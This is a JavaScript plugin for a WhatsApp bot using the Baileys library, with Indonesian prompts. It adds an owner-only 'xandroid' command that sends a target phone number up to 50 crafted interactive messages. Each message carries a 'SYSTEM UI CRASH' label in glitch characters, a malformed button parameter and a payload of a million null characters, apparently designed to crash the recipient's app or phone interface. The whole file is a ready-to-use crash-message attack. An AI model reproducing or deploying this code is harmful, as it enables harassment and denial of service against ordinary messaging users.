import {
    createRequire
} from 'module'
const require = createRequire(import.meta.url)
const { generateWAMessageFromContent, proto } = require('@adiwajshing/baileys');

async function sendSystemCrashMessage(conn, jid) {
  try {
    // Generate the message content for system crash message
    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
      'viewOnceMessage': {
        'message': {
          'interactiveMessage': {
            'header': {
              'title': '',
              'subtitle': " "
            },
            'body': {
              'text': "Halo kak simpan nomor aku dong"
            },
            'footer': {
              'text': 'Rzzz'
            },
            'nativeFlowMessage': {
              'buttons': [{
                'name': 'cta_url',
                'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
              }],
              'messageParamsJson': "\0".repeat(1000000)
            }
          }
        }
      }
    }), {
      'userJid': jid
    });

    // Relay the system crash message
    await conn.relayMessage(jid, messageContent.message, {
      'participant': {
        'jid': jid
      },
      'messageId': messageContent.key.id
    });

  } catch (error) {
    console.error('Error in sendSystemCrashMessage:', error);
    throw error; // Rethrow the error to handle it upstream
  }
}

let handler = async (m, { conn, text, command }) => {
  let [nomor, jumlah] = text.split('|');
  if (!nomor) throw `*Note : Masukan nomor yang akan di${command}, awali dengan kode negara*\n\n*Example : .${command} nomor|jumlah*\n*Contoh : .${command} 6281649357107|5*`;
  if (jumlah && isNaN(jumlah)) throw '*Note : Masukan jumlahnya*\n\n*Example : .${command} nomor|jumlah*\n*Contoh : .${command} 6281649357107|5*';

  let fixedNumber = nomor.replace(/[-+<>@]/g, '').replace(/ +/g, '').replace(/^[0]/g, '62') + '@s.whatsapp.net';
  let fixedJumlah = jumlah ? parseInt(jumlah) : 10;
  if (fixedJumlah > 50) throw 'Error!!, jumlah tidak boleh melebihi 50x️';

  await m.reply(`*Success* mengirim ${command} ke nomor : ${nomor}\n*Terkirim sebanyak : ${fixedJumlah} kali!*`);
  
  for (let i = fixedJumlah; i > 0; i--) {
    await sendSystemCrashMessage(conn, fixedNumber); // Pass `conn` to the function
  }
};

handler.help = ['xandroid'];
handler.tags = ['owner'];
handler.command = ['xandroid'];
handler.group = false;
handler.owner = true;

export default handler;